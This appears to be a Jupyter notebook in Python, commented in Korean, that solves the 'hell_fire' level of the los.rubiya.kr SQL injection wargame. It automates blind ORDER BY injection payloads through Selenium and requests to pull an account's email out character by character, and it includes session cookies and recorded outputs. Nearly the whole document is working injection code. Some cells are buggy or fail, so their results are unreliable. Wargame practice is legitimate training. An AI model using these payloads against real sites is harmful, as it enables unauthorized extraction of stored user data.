# %%
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import bs4
from time import sleep

# %%
driver = webdriver.Chrome('C:\웹 드라이버\chromedriver.exe')
driver.implicitly_wait(1)
driver.get('https://los.rubiya.kr/')

#login 
enter_page = driver.find_element_by_xpath('//*[@id="enter"]')
enter_page.click() 

sleep(1)

usr = 'dhtocks'
password = ''

driver.execute_script("document.getElementsByName('id')[0].value=\'"+usr+"\'")
driver.execute_script("document.getElementsByName('pw')[0].value=\'"+password+"\'")

login_btn = driver.find_element_by_xpath('//*[@id="butt"]/input[2]')
login_btn.click()
#login_end

sleep(1)

# %%
url = 'https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php'
answer = ''

for i in range(1,30):
    driver.get(url+"?order=length(email)=" + str(i) + ",id='rubiya'".format(i))

    html = driver.page_source
    soup = bs4.BeautifulSoup(html, 'html.parser')
    bod = soup.find('body')
    bod = bod.text[:30]

    if "idemailscorerubiyarubi" in bod:
        print('[+] 비밀번호는 '+str(i)+'입니다 [+]')
        break
# Out:
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# idemailscoreadmin*************
# [+] 비밀번호는 28입니다 [+]

# %%
url = 'https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php'
answer = ''

for j in range(1,29):
    for i in range(0,129):
        driver.get(url+"?order=conv(hex(substr(email,{},1)),16,10)={},id='rubiya'".format(j,i))

        html = driver.page_source
        soup = bs4.BeautifulSoup(html, 'html.parser')
        bod = soup.find('body')
        bod = bod.text[:30]

        if "idemailscorerubiyarubi" in bod:
            print('[+] 비밀번호는 '+str(chr(i))+'입니다 [+]')
            answer += str(chr(i))
            break
            
print('이메일 앞부분 '+answer)
# Out:
# [+] 비밀번호는 a입니다 [+]
# [+] 비밀번호는 d입니다 [+]
# [+] 비밀번호는 m입니다 [+]
# [+] 비밀번호는 n입니다 [+]
# [+] 비밀번호는 _입니다 [+]
# [+] 비밀번호는 s입니다 [+]
# [+] 비밀번호는 e입니다 [+]
# [+] 비밀번호는 c입니다 [+]
# [+] 비밀번호는 u입니다 [+]
# [+] 비밀번호는 r입니다 [+]
# [+] 비밀번호는 e입니다 [+]
# [+] 비밀번호는 _입니다 [+]
# [+] 비밀번호는 e입니다 [+]
# [+] 비밀번호는 m입니다 [+]
# [+] 비밀번호는 a입니다 [+]
# [+] 비밀번호는 i입니다 [+]
# [+] 비밀번호는 l입니다 [+]
# [+] 비밀번호는 입니다 [+]
# [+] 비밀번호는 입니다 [+]
# [+] 비밀번호는 입니다 [+]
# [+] 비밀번호는 입니다 [+]
# [+] 비밀번호는 입니다 [+]
# [+] 비밀번호는 입니다 [+]
# [+] 비밀번호는 입니다 [+]
# [+] 비밀번호는 입니다 [+]
# [+] 비밀번호는 입니다 [+]
# [+] 비밀번호는 입니다 [+]
# 이메일 앞부분 admn_secure_email

# %%
url = 'https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php'
Back = ''
for j in range(18,29):
    
    bit = ''
    
    for i in range(1,17):
        driver.get(url+"?order=substr(lpad(bin(ord(substr(email,{},1))),{},0),{},1)=1,id='rubiya'".format(j, 16, i))

        html = driver.page_source
        soup = bs4.BeautifulSoup(html, 'html.parser')
        bod = soup.find('body')
        bod = bod.text[:30]

        if "idemailscorerubiyarubi" in bod:
            # True
            bit += '1'
            break
        else:
            bit += '0'
            break
            
    print(' = Find Back Char   : ', chr(int(bit,2)), '  :  ', bit)
    
    Back += chr(int(bit, 2))
            
print('[=] Find Back String  :  ', Back)
print('\n\n')
# Out:
#  = Find Back Char   :     :   0
#  = Find Back Char   :     :   0
#  = Find Back Char   :     :   0
#  = Find Back Char   :     :   0
#  = Find Back Char   :     :   0
#  = Find Back Char   :     :   0
#  = Find Back Char   :     :   0
#  = Find Back Char   :     :   0
#  = Find Back Char   :     :   0
#  = Find Back Char   :     :   0
#  = Find Back Char   :     :   0
# [=] Find Back String  :

# %%
import requests
 
requests.packages.urllib3.disable_warnings()
sess= requests.session()
URL= 'https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order='
headers= {'Cookie':'PHPSESSID=ccsi51kaq87jc3l8e89d39gpc7'}
 
#Get the E-mail Length =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
emailLen= 0
 
for i in range(1,100):
    payload= "length(email)=" + str(i)+ ",id='rubiya'"
    res    = sess.get(url=URL+payload, headers=headers, verify=False)
 
    if 'idemailscorerubiya' in res.text:
        emailLen= i
        break
    else:
        pass
    
print('[=] Find E-mail Length : %d' % emailLen)
 

#Find the E-mail(FRONT)  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Front   = ''
rubiya  = 'rubiya805@gmail.cm'
 
for j in range(1, emailLen+1):
    for i in range(0,129):
        payload= "conv(hex(substr(email,{},1)),16,10)={},id='rubiya'".format(j,i)
        res    = sess.get(url=URL+payload, headers=headers, verify=False)
 
        if 'idemailscorerubiya' in res.text:
            if i== 0:
                break
            print('[=] Find Char : ',chr(i),' : ',hex(i))
            Front+= chr(i)
            break
        else:
            pass
 
    if i== 128:
        print('[=] Find Char : ', rubiya[j-1],' :  same with rubiya')
        Front+= rubiya[j-1]
 
 
print('[=] Find Front String : ', Front)
 
# Find the E-mail(BACK)  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
bitLen= 16
Back  = ''
 
for j in range(len(Front)+1, emailLen+1):
     
    bit= ''
 
    for i in range(1, bitLen+1):
        payload= "substr(lpad(bin(ord(substr(email,{},1))),{},0),{},1)=1,id='rubiya'".format(j, bitLen, i)
        res    = sess.get(url=URL+payload, headers=headers, verify=False)
 
        if 'idemailscorerubiya' in res.text:
            # True
            bit+= '1'
        else:
            bit+= '0'
 
    print(' =  Find Back Char    : ',chr(int(bit,2)),'  :  ', bit)
 
    Back+= chr(int(bit,2))
    
print('[=] Find Back String  : ', Back)
print('\n\n')
print('[=] Find E-mail       : ', Front+ Back)
# Out:
# [=] Find E-mail Length : 0
# [=] Find Front String :
# [=] Find Back String  :
#
#
#
# [=] Find E-mail       :

# %%
import urllib2
 
silnex=''
 
url="https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
 
for chr_l in range(1,29):
    binary=''
    for bin_l in range(1,8):
        param="?order=(select+exp(710)+where+1=(select+mid(lpad(bin(ord(mid(email,"+str(chr_l)+",1))),7,0),"+str(bin_l)+",1)+where+id='admin'))"
 
        req=urllib2.Request(url+param)
        req.add_header('cookie','PHPSESSID=6lng5klqduk4ua8hduhshbhsgf')
        if 'rubiya805' in urllib2.urlopen(req).read():
            binary+='0'
        else:
            binary+='1'
        
        print (binary)
 
    silnex = silnex+('%x' % int(binary, 2)).decode('hex')
    print("[+] " + silnex)
    
print("[+]Flag : " + silnex)
# Out:
# ---------------------------------------------------------------------------
# ModuleNotFoundError                       Traceback (most recent call last)
# <ipython-input-41-5bf280553693> in <module>
# ----> 1 import urllib2
#       2
#       3 silnex=''
#       4
#       5 url="https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
#
# ModuleNotFoundError: No module named 'urllib2'
